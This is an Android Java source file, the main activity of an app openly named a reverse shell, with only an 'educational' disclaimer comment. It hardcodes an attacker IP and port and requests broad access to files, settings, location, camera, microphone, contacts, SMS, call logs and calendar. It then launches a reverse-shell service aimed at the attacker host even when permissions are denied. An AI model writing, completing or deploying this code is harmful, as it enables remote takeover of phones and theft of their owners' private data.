package com.example.reverse_shell;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

/**
 * Android Reverse Shell - Educational/Testing Purpose Only
 * WARNING: Use only in controlled lab environment with permission
 */
public class MainActivity extends Activity {
    private static final String TAG = "RevShell";
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 101;
    private static final int SYSTEM_SETTINGS_REQUEST_CODE = 102;

    // CONFIGURE YOUR ATTACKER IP AND PORT HERE
    private static final String ATTACKER_IP = "192.168.137.89";
    private static final int ATTACKER_PORT = 4444;

    private boolean storagePermissionRequested = false;
    private boolean systemSettingsRequested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "MainActivity started - requesting permissions");
        requestAllPermissions();
    }

    /**
     * Request all necessary permissions step by step
     */
    private void requestAllPermissions() {
        // STEP 1: Request MANAGE_EXTERNAL_STORAGE for Android 11+ (highest priority)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !storagePermissionRequested) {
            if (!Environment.isExternalStorageManager()) {
                storagePermissionRequested = true;
                Log.d(TAG, "Requesting All Files Access permission");
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Error requesting storage permission: " + e.getMessage());
                }
            }
        }

        // STEP 2: Request WRITE_SETTINGS permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !systemSettingsRequested) {
            if (!Settings.System.canWrite(this)) {
                systemSettingsRequested = true;
                Log.d(TAG, "Requesting Write Settings permission");
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivityForResult(intent, SYSTEM_SETTINGS_REQUEST_CODE);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Error requesting settings permission: " + e.getMessage());
                }
            }
        }

        // STEP 3: Request runtime permissions
        requestRuntimePermissions();
    }

    /**
     * Request all runtime permissions at once
     */
    private void requestRuntimePermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Build comprehensive permission list based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ permissions
            addPermissionIfNeeded(permissionsToRequest, Manifest.permission.POST_NOTIFICATIONS);
            addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_MEDIA_IMAGES);
            addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_MEDIA_VIDEO);
            addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            // Android 12 and below
            addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_EXTERNAL_STORAGE);
            addPermissionIfNeeded(permissionsToRequest, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        // Common permissions for all versions
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.ACCESS_FINE_LOCATION);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.ACCESS_COARSE_LOCATION);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.CAMERA);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.RECORD_AUDIO);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_CONTACTS);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_SMS);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.SEND_SMS);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_CALL_LOG);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_PHONE_STATE);
        addPermissionIfNeeded(permissionsToRequest, Manifest.permission.READ_CALENDAR);

        // Background location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            addPermissionIfNeeded(permissionsToRequest, Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }

        // Request all permissions at once
        if (!permissionsToRequest.isEmpty()) {
            Log.d(TAG, "Requesting " + permissionsToRequest.size() + " runtime permissions");
            String[] permissions = permissionsToRequest.toArray(new String[0]);
            requestPermissions(permissions, PERMISSION_REQUEST_CODE);
        } else {
            // All permissions already granted, start service
            Log.d(TAG, "All permissions granted, starting service");
            startReverseShell();
            finish();
        }
    }

    /**
     * Helper to add permission only if not already granted
     */
    private void addPermissionIfNeeded(List<String> permissions, String permission) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(permission);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Log.d(TAG, "All Files Access permission granted");
                } else {
                    Log.w(TAG, "All Files Access permission denied");
                }
            }
            // Continue with next permissions
            requestAllPermissions();
        } else if (requestCode == SYSTEM_SETTINGS_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.System.canWrite(this)) {
                    Log.d(TAG, "Write Settings permission granted");
                } else {
                    Log.w(TAG, "Write Settings permission denied");
                }
            }
            // Continue with next permissions
            requestAllPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            int granted = 0;
            int denied = 0;

            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    granted++;
                    Log.d(TAG, "✓ Permission granted: " + permissions[i]);
                } else {
                    denied++;
                    Log.w(TAG, "✗ Permission denied: " + permissions[i]);
                }
            }

            Log.d(TAG, "Permission summary - Granted: " + granted + ", Denied: " + denied);

            // Start service regardless of permission results
            startReverseShell();
            finish();
        }
    }

    /**
     * Start the reverse shell service
     */
    private void startReverseShell() {
        Intent serviceIntent = new Intent(this, ReverseShellService.class);
        serviceIntent.putExtra("ATTACKER_IP", ATTACKER_IP);
        serviceIntent.putExtra("ATTACKER_PORT", ATTACKER_PORT);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Log.d(TAG, "Reverse shell service started: " + ATTACKER_IP + ":" + ATTACKER_PORT);
    }
}
